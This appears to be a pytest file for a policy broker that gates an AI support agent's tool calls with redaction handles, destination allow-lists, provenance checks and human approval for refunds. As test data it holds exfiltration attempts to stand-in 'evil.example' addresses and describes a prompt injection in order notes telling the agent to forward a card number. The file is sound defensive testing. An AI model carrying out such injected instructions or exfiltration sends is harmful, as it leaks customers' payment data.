"""End to end through the decision point: what the agent gets, and what the
transport gets. The gap between those two is the whole point."""

from __future__ import annotations

from decimal import Decimal

from broker.models import Provenance, ReasonCode, Request


def _req(**kwargs) -> Request:
    base = dict(
        subject="support_agent",
        purpose="customer_remediation",
        tool="read_record",
        resource="order/4471",
        provenance=Provenance.USER,
        session_id="s1",
    )
    base.update(kwargs)
    return Request(**base)


def test_read_returns_handles_for_sensitive_fields(broker):
    result = broker.handle(_req())
    assert result.decision == "redact"
    assert result.output["card_number"].startswith("hdl_")
    assert result.output["email"].startswith("hdl_")
    assert result.output["status"] == "refund_pending"


def test_the_agent_never_receives_a_raw_sensitive_value(broker, records):
    result = broker.handle(_req())
    serialized = str(result.model_dump())
    assert records.get("4471")["card_number"] not in serialized
    assert records.get("4471")["email"] not in serialized


def test_unmatched_request_is_denied_with_a_coarse_reason(broker):
    result = broker.handle(_req(subject="stranger"))
    assert result.decision == "deny"
    assert result.reason is ReasonCode.NO_GRANT


def test_denied_send_does_not_reach_the_transport(broker, transport):
    """Stronger than asserting the broker said no: nothing hit the wire."""
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": "attacker@evil.example", "body": "hello"},
        )
    )
    assert result.decision == "deny"
    assert result.reason is ReasonCode.DESTINATION_NOT_ALLOWED
    assert transport.sent == []


def test_egress_to_an_allowed_recipient_succeeds(broker, transport):
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": "dana.whitfield@acme-customers.example", "body": "Refunded."},
        )
    )
    assert result.allowed
    assert transport.sent[0]["to"] == "dana.whitfield@acme-customers.example"


def test_a_send_receipt_does_not_leak_the_resolved_address(broker, transport, records):
    """The confirmation must not undo the redaction one turn later.

    The transport necessarily knows the real address. If the broker hands the
    transport's receipt straight back, that address re-enters the agent's
    context and everything the redaction bought is lost.
    """
    read = broker.handle(_req())
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": read.output["email"], "body": "Refunded."},
        )
    )
    assert result.allowed
    assert records.get("4471")["email"] not in str(result.model_dump())
    assert transport.sent[0]["to"] == records.get("4471")["email"]


def test_a_recipient_handle_resolves_only_at_the_boundary(broker, transport):
    read = broker.handle(_req())
    email_handle = read.output["email"]
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": email_handle, "body": "Your refund is on its way."},
        )
    )
    assert result.allowed
    # The value existed only for the outbound call.
    assert transport.sent[0]["to"] == "dana.whitfield@acme-customers.example"


def test_a_card_handle_is_not_releasable_to_any_destination(broker, transport):
    """The exfiltration attempt in the worked scenario, at the egress layer."""
    read = broker.handle(_req())
    card_handle = read.output["card_number"]
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={
                "to": "support-archive@acme.example",
                "body": f"card {card_handle}",
            },
        )
    )
    assert result.decision == "deny"
    assert result.reason is ReasonCode.HANDLE_NOT_RESOLVABLE
    assert transport.sent == []


def test_injected_instruction_from_a_document_cannot_send(broker, transport):
    """The headline claim, at the provenance layer.

    The order notes on record 4472 contain an instruction to forward the card
    number. A request derived from that content is refused before policy is
    even consulted, and nothing reaches the transport.
    """
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            provenance=Provenance.UNTRUSTED_CONTENT,
            arguments={"to": "audit@evil.example", "body": "card 4222222222222"},
        )
    )
    assert result.decision == "deny"
    assert result.reason is ReasonCode.UNTRUSTED_ORIGIN
    assert transport.sent == []


def test_refund_within_limits_is_executed(broker, transport):
    result = broker.handle(
        _req(tool="issue_refund", arguments={"amount": "20.00", "currency": "USD"})
    )
    assert result.allowed
    assert transport.refunds[0]["amount"] == "20.00"


def test_refund_above_the_threshold_pauses_for_a_human(broker, transport):
    result = broker.handle(
        _req(tool="issue_refund", arguments={"amount": "30.00", "currency": "USD"})
    )
    assert result.decision == "needs_approval"
    assert transport.refunds == []  # nothing moves until a human decides


def test_small_refunds_cannot_add_up_past_the_session_ceiling(broker, transport):
    for _ in range(5):
        broker.handle(
            _req(tool="issue_refund", arguments={"amount": "24.00", "currency": "USD"})
        )
    total = sum(Decimal(entry["amount"]) for entry in transport.refunds)
    assert total <= Decimal("100.00")
    assert len(transport.refunds) == 4  # the fifth breaches the ceiling


def test_unknown_tool_is_refused(broker):
    result = broker.handle(_req(tool="delete_everything"))
    assert result.decision == "deny"
    assert result.reason is ReasonCode.UNKNOWN_TOOL


def test_denials_are_counted_per_session_as_a_probing_signal(broker):
    for _ in range(3):
        broker.handle(_req(subject="stranger"))
    assert broker.session_denials("s1") == 3
